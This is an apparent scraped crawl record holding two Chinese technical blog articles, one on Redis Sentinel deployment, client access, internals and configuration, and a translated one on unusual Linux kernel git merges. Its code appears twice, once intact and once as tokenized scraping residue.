演示故障转移,\n,哨兵的4个作用中，配置提供者和通知需要客户端的配合，本文将在下一章介绍客户端访问哨兵系统的方法时详细介绍。这一小节将演示当主节点发生故障时，哨兵的监控和自动故障转移功能。,\n,（1）首先，使用kill命令杀掉主节点：,\n,\n,（2）如果此时立即在哨兵节点中使用info Sentinel命令查看，会发现主节点还没有切换过来，因为哨兵发现主节点故障并转移，需要一段时间。,\n,\n,（3）一段时间以后，再次在哨兵节点中执行info Sentinel查看，发现主节点已经切换成6380节点。,\n,\n,但是同时可以发现，哨兵节点认为新的主节点仍然有2个从节点，这是因为哨兵在将6380切换成主节点的同时，将6379节点置为其从节点；虽然6379从节点已经挂掉，但是由于哨兵并不会对从节点进行客观下线（其含义将在原理部分介绍），因此认为该从节点一直存在。当6379节点重新启动后，会自动变成6380节点的从节点。下面验证一下。,\n,（4）重启6379节点：可以看到6379节点成为了6380节点的从节点。,\n,\n,（5）在故障转移阶段，哨兵和主从节点的配置文件都会被改写。,\n,对于主从节点，主要是slaveof配置的变化：新的主节点没有了slaveof配置，其从节点则slaveof新的主节点。,\n,对于哨兵节点，除了主从节点信息的变化，纪元(epoch)也会变化，下图中可以看到纪元相关的参数都+1了。,\n,\n,4.  总结,\n,哨兵系统的搭建过程，有几点需要注意：,\n,（1）哨兵系统中的主从节点，与普通的主从节点并没有什么区别，故障发现和转移是由哨兵来控制和完成的。,\n,（2）哨兵节点本质上是redis节点。,\n,（3）每个哨兵节点，只需要配置监控主节点，便可以自动发现其他的哨兵节点和从节点。,\n,（4）在哨兵节点启动和故障转移阶段，各个节点的配置文件会被重写(config rewrite)。,\n,（5）本章的例子中，一个哨兵只监控了一个主节点；实际上，一个哨兵可以监控多个主节点，通过配置多条sentinel monitor即可实现。,\n,三、客户端访问哨兵系统,\n,上一小节演示了哨兵的两大作用：监控和自动故障转移，本小节则结合客户端演示哨兵的另外两个作用：配置提供者和通知。,\n,1.  代码示例,\n,在介绍客户端的原理之前，先以Java客户端Jedis为例，演示一下使用方法：下面代码可以连接我们刚刚搭建的哨兵系统，并进行各种读写操作（代码中只演示如何连接哨兵，异常处理、资源关闭等未考虑）。,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\npublic static void testSentinel() throws Exception {\r\n         String masterName = \"mymaster\";\r\n         Set<String> sentinels = new HashSet<>();\r\n         sentinels.add(\"192.168.92.128:26379\");\r\n         sentinels.add(\"192.168.92.128:26380\");\r\n         sentinels.add(\"192.168.92.128:26381\");\r\n\r\n         JedisSentinelPool pool = new JedisSentinelPool(masterName, sentinels); //初始化过程做了很多工作\r\n         Jedis jedis = pool.getResource();\r\n         jedis.set(\"key1\", \"value1\");\r\n         pool.close();\r\n},\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,public, ,static, ,void, ,testSentinel,(,), ,throws, ,Exception, ,{,         ,String, ,masterName, ,=, ,\"mymaster\",;,         ,Set,<,String,>, ,sentinels, ,=, ,new, ,HashSet,<>,(,),;,         ,sentinels,.,add,(,\"192.168.92.128:26379\",),;,         ,sentinels,.,add,(,\"192.168.92.128:26380\",),;,         ,sentinels,.,add,(,\"192.168.92.128:26381\",),;, ,         ,JedisSentinelPool ,pool, ,=, ,new, ,JedisSentinelPool,(,masterName,,, ,sentinels,),;, ,//初始化过程做了很多工作,         ,Jedis ,jedis, ,=, ,pool,.,getResource,(,),;,         ,jedis,.,set,(,\"key1\",,, ,\"value1\",),;,         ,pool,.,close,(,),;,},\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,2.  客户端原理,\n,Jedis客户端对哨兵提供了很好的支持。如上述代码所示，我们只需要向Jedis提供哨兵节点集合和masterName，构造JedisSentinelPool对象；然后便可以像使用普通redis连接池一样来使用了：通过pool.getResource()获取连接，执行具体的命令。,\n,在整个过程中，我们的代码不需要显式的指定主节点的地址，就可以连接到主节点；代码中对故障转移没有任何体现，就可以在哨兵完成故障转移后自动的切换主节点。之所以可以做到这一点，是因为在JedisSentinelPool的构造器中，进行了相关的工作；主要包括以下两点：,\n,（1）,遍历哨兵节点，获取主节点信息：,遍历哨兵节点，通过其中一个哨兵节点+masterName获得主节点的信息；该功能是通过调用哨兵节点的sentinel get-master-addr-by-name命令实现，该命令示例如下：,\n,\n,一旦获得主节点信息，停止遍历（因此一般来说遍历到第一个哨兵节点，循环就停止了）。,\n,（2）,增加对哨兵的监听：,这样当发生故障转移时，客户端便可以收到哨兵的通知，从而完成主节点的切换。具体做法是：利用redis提供的发布订阅功能，为每一个哨兵节点开启一个单独的线程，订阅哨兵节点的+switch-master频道，当收到消息时，重新初始化连接池。,\n,3.  总结,\n,通过客户端原理的介绍，可以加深对哨兵功能的理解：,\n,（1）配置提供者：客户端可以通过哨兵节点+masterName获取主节点信息，在这里哨兵起到的作用就是配置提供者。,\n,需要注意的是，哨兵只是配置提供者，而不是代理,。二者的区别在于：如果是配置提供者，客户端在通过哨兵获得主节点信息后，会直接建立到主节点的连接，后续的请求(如set/get)会直接发向主节点；如果是代理，客户端的每一次请求都会发向哨兵，哨兵再通过主节点处理请求。,\n,举一个例子可以很好的理解哨兵的作用是配置提供者，而不是代理。在前面部署的哨兵系统中，将哨兵节点的配置文件进行如下修改：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nsentinel monitor mymaster 192.168.92.128 6379 2\r\n改为\r\nsentinel monitor mymaster 127.0.0.1 6379 2,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,sentinel ,monitor ,mymaster, ,192.168.92.128, ,6379, ,2,改为,sentinel ,monitor ,mymaster, ,127.0.0.1, ,6379, ,2,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,然后，将前述客户端代码在局域网的另外一台机器上运行，会发现客户端无法连接主节点；这是因为哨兵作为配置提供者，客户端通过它查询到主节点的地址为127.0.0.1:6379，客户端会向127.0.0.1:6379建立redis连接，自然无法连接。如果哨兵是代理，这个问题就不会出现了。,\n,（2）通知：哨兵节点在故障转移完成后，会将新的主节点信息发送给客户端，以便客户端及时切换主节点。,\n,四、基本原理,\n,前面介绍了哨兵部署、使用的基本方法，本部分介绍哨兵实现的基本原理。,\n,1.  哨兵节点支持的命令,\n,哨兵节点作为运行在特殊模式下的redis节点，其支持的命令与普通的redis节点不同。在运维中，我们可以通过这些命令查询或修改哨兵系统；不过更重要的是，哨兵系统要实现故障发现、故障转移等各种功能，离不开哨兵节点之间的通信，而通信的很大一部分是通过哨兵节点支持的命令来实现的。下面介绍哨兵节点支持的主要命令。,\n,（1）基础查询：通过这些命令，可以查询哨兵系统的拓扑结构、节点信息、配置信息等。,\n,\n,info sentinel：获取监控的所有主节点的基本信息,\n,sentinel masters：获取监控的所有主节点的详细信息,\n,sentinel master mymaster：获取监控的主节点mymaster的详细信息,\n,sentinel slaves mymaster：获取监控的主节点mymaster的从节点的详细信息,\n,sentinel sentinels mymaster：获取监控的主节点mymaster的哨兵节点的详细信息,\n,sentinel get-master-addr-by-name mymaster：获取监控的主节点mymaster的地址信息，前文已有介绍,\n,sentinel is-master-down-by-addr：哨兵节点之间可以通过该命令询问主节点是否下线，从而对是否客观下线做出判断,\n,\n,（2）增加/移除对主节点的监控,\n,sentinel monitor mymaster2 192.168.92.128 16379 2：与部署哨兵节点时配置文件中的sentinel monitor功能完全一样，不再详述,\n,sentinel remove mymaster2：取消当前哨兵节点对主节点mymaster2的监控,\n,（3）强制故障转移,\n,sentinel failover mymaster：该命令可以,强制对,mymaster,执行故障转移，,即便当前的主节点运行完好；例如，如果当前主节点所在机器即将报废，便可以提前通过failover命令进行故障转移。,\n,2.  基本原理,\n,关于哨兵的原理，关键是了解以下几个概念。,\n,（1）定时任务：每个哨兵节点维护了3个定时任务。定时任务的功能分别如下：通过向主从节点发送info命令获取最新的主从结构；通过发布订阅功能获取其他哨兵节点的信息；通过向其他节点发送ping命令进行心跳检测，判断是否下线。,\n,（2）主观下线：在心跳检测的定时任务中，如果其他节点超过一定时间没有回复，哨兵节点就会将其进行主观下线。顾名思义，主观下线的意思是一个哨兵节点“主观地”判断下线；与主观下线相对应的是客观下线。,\n,（3）客观下线：哨兵节点在对主节点进行主观下线后，会通过sentinel is-master-down-by-addr命令询问其他哨兵节点该主节点的状态；如果判断主节点下线的哨兵数量达到一定数值，则对该主节点进行客观下线。,\n,需要特别注意的是，客观下线是主节点才有的概念；如果从节点和哨兵节点发生故障，被哨兵主观下线后，不会再有后续的客观下线和故障转移操作。,\n,（4）选举领导者哨兵节点：当主节点被判断客观下线以后，各个哨兵节点会进行协商，选举出一个领导者哨兵节点，并由该领导者节点对其进行故障转移操作。,\n,监视该主节点的所有哨兵都有可能被选为领导者，选举使用的算法是Raft算法；Raft算法的基本思路是先到先得：即在一轮选举中，哨兵A向B发送成为领导者的申请，如果B没有同意过其他哨兵，则会同意A成为领导者。选举的具体过程这里不做详细描述，一般来说，哨兵选择的过程很快，谁先完成客观下线，一般就能成为领导者。,\n,（5）故障转移：选举出的领导者哨兵，开始进行故障转移操作，该操作大体可以分为3个步骤：,\n,\n,在从节点中选择新的主节点：选择的原则是，首先过滤掉不健康的从节点；然后选择优先级最高的从节点(由slave-priority指定)；如果优先级无法区分，则选择复制偏移量最大的从节点；如果仍无法区分，则选择runid最小的从节点。,\n,更新主从状态：通过slaveof no one命令，让选出来的从节点成为主节点；并通过slaveof命令让其他节点成为其从节点。,\n,将已经下线的主节点(即6379)设置为新的主节点的从节点，当6379重新上线后，它会成为新的主节点的从节点。,\n,\n,通过上述几个关键概念，可以基本了解哨兵的工作原理。为了更形象的说明，下图展示了领导者哨兵节点的日志，包括从节点启动到完成故障转移。,\n,\n,五、配置与实践建议,\n,1.  配置,\n,下面介绍与哨兵相关的几个配置。,\n,（1） sentinel monitor {masterName} {masterIp} {masterPort} {quorum},\n,sentinel monitor是哨兵最核心的配置，在前文讲述部署哨兵节点时已说明，其中：masterName指定了主节点名称，masterIp和masterPort指定了主节点地址，quorum是判断主节点客观下线的哨兵数量阈值：当判定主节点下线的哨兵数量达到quorum时，对主节点进行客观下线。建议取值为哨兵数量的一半加1。,\n,（2） sentinel down-after-milliseconds {masterName} {time},\n,sentinel down-after-milliseconds与主观下线的判断有关：哨兵使用ping命令对其他节点进行心跳检测，如果其他节点超过down-after-milliseconds配置的时间没有回复，哨兵就会将其进行主观下线。该配置对主节点、从节点和哨兵节点的主观下线判定都有效。,\n,down-after-milliseconds的默认值是30000，即30s；可以根据不同的网络环境和应用要求来调整：值越大，对主观下线的判定会越宽松，好处是误判的可能性小，坏处是故障发现和故障转移的时间变长，客户端等待的时间也会变长。例如，如果应用对可用性要求较高，则可以将值适当调小，当故障发生时尽快完成转移；如果网络环境相对较差，可以适当提高该阈值，避免频繁误判。,\n,（3） sentinel parallel-syncs {masterName} {number},\n,sentinel parallel-syncs与故障转移之后从节点的复制有关：它规定了每次向新的主节点发起复制操作的从节点个数。例如，假设主节点切换完成之后，有3个从节点要向新的主节点发起复制；如果parallel-syncs=1，则从节点会一个一个开始复制；如果parallel-syncs=3，则3个从节点会一起开始复制。,\n,parallel-syncs取值越大，从节点完成复制的时间越快，但是对主节点的网络负载、硬盘负载造成的压力也越大；应根据实际情况设置。例如，如果主节点的负载较低，而从节点对服务可用的要求较高，可以适量增加parallel-syncs取值。parallel-syncs的默认值是1。,\n,（4） sentinel failover-timeout {masterName} {time},\n,sentinel failover-timeout与故障转移超时的判断有关，但是该参数不是用来判断整个故障转移阶段的超时，而是其几个子阶段的超时，例如如果主节点晋升从节点时间超过timeout，或从节点向新的主节点发起复制操作的时间(不包括复制数据的时间)超过timeout，都会导致故障转移超时失败。,\n,failover-timeout的默认值是180000，即180s；如果超时，则下一次该值会变为原来的2倍。,\n,（5）除上述几个参数外，还有一些其他参数，如安全验证相关的参数，这里不做介绍。,\n,2.  实践建议,\n,（1）哨兵节点的数量应不止一个，一方面增加哨兵节点的冗余，避免哨兵本身成为高可用的瓶颈；另一方面减少对下线的误判。此外，这些不同的哨兵节点应部署在不同的物理机上。,\n,（2）哨兵节点的数量应该是奇数，便于哨兵通过投票做出“决策”：领导者选举的决策、客观下线的决策等。,\n,（3）各个哨兵节点的配置应一致，包括硬件、参数等；此外，所有节点都应该使用ntp或类似服务，保证时间准确、一致。,\n,（4）哨兵的配置提供者和通知客户端功能，需要客户端的支持才能实现，如前文所说的Jedis；如果开发者使用的库未提供相应支持，则可能需要开发者自己实现。,\n,（5）当哨兵系统中的节点在docker（或其他可能进行端口映射的软件）中部署时，应特别注意端口映射可能会导致哨兵系统无法正常工作，因为哨兵的工作基于与其他节点的通信，而docker的端口映射可能导致哨兵无法连接到其他节点。例如，哨兵之间互相发现，依赖于它们对外宣称的IP和port，如果某个哨兵A部署在做了端口映射的docker中，那么其他哨兵使用A宣称的port无法连接到A。,\n,六、总结,\n,本文首先介绍了哨兵的作用：监控、故障转移、配置提供者和通知；然后讲述了哨兵系统的部署方法，以及通过客户端访问哨兵系统的方法；再然后简要说明了哨兵实现的基本原理；最后给出了关于哨兵实践的一些建议。,\n,在主从复制的基础上，哨兵引入了主节点的自动故障转移，进一步提高了Redis的高可用性；但是哨兵的缺陷同样很明显：哨兵无法对从节点进行自动故障转移，在读写分离场景下，从节点故障会导致读服务不可用，需要我们对从节点做额外的监控、切换操作。,\n,此外，哨兵仍然没有解决写操作无法负载均衡、及存储能力受到单机限制的问题；这些问题的解决需要使用集群，我将在后面的文章中介绍，欢迎关注。,\n,参考文献,\n,https://redis.io/topics/sentinel,\n,http://www.redis.cn/,\n,《Redis开发与运维》,\n,《Redis设计与实现》,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 1 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114382/", "url_object_id": "3241c8714d76296e3d9a75803c871f8c", "front_image_path": "full/c766feed221138f7946130756cddfc7e86e388b4.jpg"},{"front_image_url": ["http://wx1.sinaimg.cn/mw690/7cc829d3gy1fu22uq61vrj20mr0d040p.jpg"], "title": "Linux 内核 Git 历史记录中，最大最奇怪的提交信息是这样的", "create_time": "2018/08/08", "vote": "1", "bookmark": "2", "comments": "1", "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,本文由 ,伯乐在线, - ,可乐, 翻译，,艾凌风, 校稿。未经许可，禁止转载！,英文出处：,destroyallsoftware,。欢迎加入,翻译组,。,\n,我们通常认为 git merges 有两个父节点。例如，由我写的最新的 Linux 内核合并操作是提交2c5d955,这是 4.10-rc6 版本发行前准备工作的一部分。它有两个父节点:,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n2c5d955 Merge branch 'parisc-4.10-3' of ...\r\n|\r\n*- 2ad5d52 parisc: Don't use BITS_PER_LONG in use ...\r\n*- 53cd1ad Merge branch 'i2c/for-current' of ...,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,2c5d955, ,Merge ,branch, ,'parisc-4.10-3', ,of, ,.,.,.,|,*,-, ,2ad5d52, ,parisc,:, ,Don,'t use BITS_PER_LONG in use ...,*- 53cd1ad Merge branch ',i2c,/,for,-,current,', ,of, ,.,.,.,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,Git 还支持章鱼式的合并，这意味着可以有超过两个父节点的合并。这对于我们那些从事小型项目开发的人来说，这似乎很奇怪：与三四个父节点合并会不会令人感到困惑？这得看情况而定。有时候，一个内核的维护者需要一次同时合并几十个单独的历史记录。一个接着一个的30个合并提交比起单独的一个30路(30个父节点)合并更加令人困惑，特别是当30路合并没有冲突的时候。,\n,章鱼式合并可能比你想象地更常见。在内核的提交历史记录中有649,306个提交。其中 46,930 (7.2%) 个提交是合并提交。在合并提交中，有 1,549 (3.3%) 是章鱼式合并。(截止到我当前的 git HEAD 指向的提交 566cf87 。),\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ git log --oneline | wc -l\r\n   649306\r\n$ git log --oneline --merges | wc -l\r\n   46930\r\n$ git log --oneline --min-parents=3 | wc -l\r\n    1549,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,git ,log, ,--,oneline, ,|, ,wc, ,-,l,   ,649306,$, ,git ,log, ,--,oneline, ,--,merges, ,|, ,wc, ,-,l,   ,46930,$, ,git ,log, ,--,oneline, ,--,min,-,parents,=,3, ,|, ,wc, ,-,l,    ,1549,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,作为比较，Rails 的所有提交中的 20% 是合并提交 (12,401/63,111),但没有一个章鱼式合并。Rails 大概更能代表一般的工程; 我认为大多数的 git 用户甚至都不知道章鱼式合并。,\n,现在，显而易见的问题是: 这些章鱼式合并的规模有多大？ 在这里每行开头的 “>” 是续行符；这个命令写了总共5行。这篇文章中的所有命令都是我在做实验的时候输入到终端里面的，所以它们未必容易看懂。我对于结果更感兴趣，贴出代码只是为了满足那些好奇的人。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ (git log --min-parents=2 --pretty='format:%h %P' |\r\n>  ruby -ne '/^(w+) (.*)$/ =~ $_; puts \"#{$2.split.count} #{$1}\"' |\r\n>  sort -n |\r\n>  tail -1)\r\n66 2cde51f,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,(,git ,log, ,--,min,-,parents,=,2, ,--,pretty,=,'format:%h %P', ,|,>,  ,ruby, ,-,ne, ,'/^(w+) (.*)$/ =~ $_; puts \"#{$2.split.count} #{$1}\"', ,|,>,  ,sort, ,-,n, ,|,>,  ,tail, ,-,1,),66, ,2cde51f,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,66 个父节点！这么多的父节点，这个提交到底发生了什么？,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ git log -1 2cde51f\r\ncommit 2cde51fbd0f310c8a2c5f977e665c0ac3945b46d\r\nMerge: 7471c5c c097d5f 74c375c 04c3a85 5095f55 4f53477\r\n2f54d2a 56d37d8 192043c f467a0f bbe5803 3990c51 d754fa9\r\n516ea4b 69ae848 25c1a63 f52c919 111bd7b aafa85e dd407a3\r\n71467e4 0f7f3d1 8778ac6 0406a40 308a0f3 2650bc4 8cb7a36\r\n323702b ef74940 3cec159 72aa62b 328089a 11db0da e1771bc\r\nf60e547 a010ff6 5e81543 58381da 626bcac 38136bd 06b2bd2\r\n8c5178f 8e6ad35 008ef94 f58c4fc4 2309d67 5c15371 b65ab73\r\n26090a8 9ea6fbc 2c48643 1769267 f3f9a60 f25cf34 3f30026\r\nfbbf7fe c3e8494 e40e0b5 50c9697 6358711 0112b62 a0a0591\r\nb888edb d44008b 9a199b8 784cbf8\r\nAuthor: Mark Brown <[email redacted for privacy]>\r\nDate:   Thu Jan 2 13:01:55 2014 +0000\r\n\r\n    Merge remote-tracking branches [65 remote branch names],\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,git ,log, ,-,1, ,2cde51f,commit, ,2cde51fbd0f310c8a2c5f977e665c0ac3945b46d,Merge,:, ,7471c5c, ,c097d5f, ,74c375c, ,04c3a85, ,5095f55, ,4f53477,2f54d2a, ,56d37d8, ,192043c, ,f467a0f ,bbe5803, ,3990c51, ,d754fa9,516ea4b, ,69ae848, ,25c1a63, ,f52c919, ,111bd7b, ,aafa85e ,dd407a3,71467e4, ,0f7f3d1, ,8778ac6, ,0406a40, ,308a0f3, ,2650bc4, ,8cb7a36,323702b, ,ef74940, ,3cec159, ,72aa62b, ,328089a, ,11db0da, ,e1771bc,f60e547 ,a010ff6, ,5e81543, ,58381da, ,626bcac, ,38136bd, ,06b2bd2,8c5178f, ,8e6ad35, ,008ef94, ,f58c4fc4, ,2309d67, ,5c15371, ,b65ab73,26090a8, ,9ea6fbc, ,2c48643, ,1769267, ,f3f9a60 ,f25cf34, ,3f30026,fbbf7fe ,c3e8494 ,e40e0b5, ,50c9697, ,6358711, ,0112b62, ,a0a0591,b888edb ,d44008b, ,9a199b8, ,784cbf8,Author,:, ,Mark ,Brown, ,<,[,email ,redacted ,for, ,privacy,],>,Date,:,   ,Thu ,Jan, ,2, ,13,:,01,:,55, ,2014, ,+,0000, ,    ,Merge ,remote,-,tracking ,branches, ,[,65, ,remote ,branch ,names,],\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,这让许多历史记录可视化工具都无法正常运行，引出了 Linus Torvalds 的一个,回应,:,\n,我刚刚从 Takashi 那收到了一些消息，因此我看到了你的合并提交 2cde51fbd0f3 。这个提交有 66 个父节点。,\n,[…],\n,它被拉取（pulled）了，并且状况良好，但显然它在 “章鱼式合并很好” 和 “上帝” 之间做到了平衡，这不是一个章鱼式合并，这是一个克苏鲁(一个章鱼头人神的巨人)式的合并。,\n,正如我所看到的，这个有66个父节点的不同寻常的提交在某种程度上只是对于ASoc代码修改的正常合并。ASoc 代表了芯片上的ALSA系统。ALSA系统是音频子系统；“单片系统是集成在单片硅芯片上计算机的术语。综上所述，ASoc 是对嵌入式设备的声音支持系统。,\n,那么这样的合并多久会发生一次呢？永远都不会发生。规模排第二的合并是 fa623d1 ,它仅仅有 30 个父节点。然而，因为足够的背景知识，从 30 到 66 之间的巨大差距并不会令人感到惊讶。,\n,一次 git 提交的父节点的数量大概是一种单侧分布(通常非正式的说法是幂律分布，因为这里对这个不感兴趣，所以不必严格正确)。软件系统的许多属性都属于单侧分布。等一下；我将会生成一个图表来确定…(大量严格的图表确定了)。是的，它确实是单侧分布:,\n,\n,简单地说来, “单侧分布”意味着小事件比大事件多得多，而且大事件的最大规模是没有界限的。内核的提交历史中包含了 45,381 个两个父节点的合并，但仅仅有一个 66个父节点的合并。假如考虑足够多的开发历史记录的话，我们可能会看到多于66个父节点的合并。,\n,单个函数或是单个模块的代码行数也是单侧分布（大多数函数和模块都很小，但是其中一些很大；想想 web app 中的 “User” 类)。同样，对于模块的变化率（大多数模块都不会经常变动，只有其中一些会不断改动；再想想 “User” 类）。这些分布在软件开发中无处不在，而且经常在下面的双对数坐标图中呈直线分布。,\n,对于父节点的数量最大的提交，我们就讨论到这。那么在差异方面的合并又怎样呢？在差异方面，我的意思是被合并的两个分支之间的差异。我们可以通过简单地比较合并节点的父节点，然后统计它们差异的行数来衡量这一点。,\n,例如，如果一个分支一年前从 master 分支分离出去，改变了一行代码，之后被合并回 master 分支，在这段时间内对于 master 分支的所有修改都会被统计到，同样分离出去的分支上的改变也会被统计到。我们可以引出更直观的差异概念，但因为 git 不会保留分支的元数据，所以它们很难或者说是几乎不可能计算出来。,\n,在任何情况下，作为计算差异的起点，下面是最近内核合并的差异：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ git diff $(git log --merges -1 --pretty='format:%P') | wc -l\r\n     173,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,git ,diff, ,$,(,git ,log, ,--,merges, ,-,1, ,--,pretty,=,'format:%P',), ,|, ,wc, ,-,l,     ,173,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,在英语中，这个命令的含义是这样的：“比较最近合并的两个父节点，然后统计差异的行数。”为了找出差异最多的合并，我们可以遍历每个合并提交，用类似的方法统计差异的行数。然后，作为一个测试，我们将搜索所有合并中恰好有 2,000 行差异的分支。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ (git log --merges --pretty=\"%h\" |\r\n   while read x; do\r\n     echo \"$(git diff $(git log --pretty=%P $x -1) | wc -l)\" $x\r\n   done > merges.txt)\r\n$ sort -n merges.txt | grep 'b2000b'\r\n    2000 3d6ce33\r\n    2000 7fedd7e\r\n    2000 f33f6f0,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,(,git ,log, ,--,merges, ,--,pretty,=,\"%h\", ,|,   ,while, ,read, ,x,;, ,do,     ,echo, ,\"$(git diff $(git log --pretty=%P $x -1) | wc -l)\", ,$,x,   ,done, ,>, ,merges,.,txt,),$, ,sort, ,-,n, ,merges,.,txt, ,|, ,grep, ,'b2000b',    ,2000, ,3d6ce33,    ,2000, ,7fedd7e,    ,2000, ,f33f6f0,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,（这个命令需要花费很长的时间运行: 我想大约需要12小时，尽管我已经减少了许多。）,\n,我认为合并的差异大小遵循单侧分布，就像父节点数量的统计一样。所以它应该在双对数坐标图表中显示为一条直线。让我检查一下….对了:,\n,\n,我把差异的大小定在1000行左右(注：前面用2000行，得到的数据太少)，否则没有足够的样本来生成有效的曲线。,\n,右下角难看的原因部分是因为量化问题，另一部分是由于缺乏大量的提交导致样本数量较小，与之前的图表情况一样。,\n,现在，显而易见的问题是: 提交历史中差异最大的合并是哪个？,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ sort -n merges.txt | tail -1\r\n 22445760 f44dd18,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,sort, ,-,n, ,merges,.,txt, ,|, ,tail, ,-,1, ,22445760, ,f44dd18,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,22,445,760 行差异！这看起来根本不可能这么大-因为差异的行数比整个内核源代码的行数都大。,\n,Greg Kroah-Hartman 在2016年9月19做了这一提交，当时正处在 4.8-rc6 版本的开发期间。Greg 是 Linus Torvalds 的 “副官” 之一 – 他（Linus）最亲近，最值得信赖的开发者。简单地说，副官们构成了内核 pull request 树中的第一层。Greg 负责维护内核的稳定分支，驱动程序内核，USB 子系统和其他几个子系统。,\n,在更加仔细的研究这个合并之前，我们需要一点背景知识。通常我们把合并作为菱形分支模式（先分支，然后合并，见下图）的一部分:,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n  A\r\n / \r\nB   C\r\n  /\r\n  D,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,  ,A, ,/, ,B,   ,C,  ,/,  ,D,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,在2014年，Greg 开始在一个新的仓库开发 Greybus (,移动设备总线,)，这就好像是他创建了一个全新的项目一样。最后，Greybus 的开发工作完成时，它就被合并到了内核中。但因为它是从一个崭新的仓库开始的，所以它和内核的中的其他源代码没有共同的历史记录。所以除了2005年我们公认的初始提交之外，这个合并为内核又添加了一个 “初始提交”。这个仓库现在有两条独立的初始提交，而不是通常的菱形分支模式：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n  A\r\n / \r\nB   C,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,  ,A, ,/, ,B,   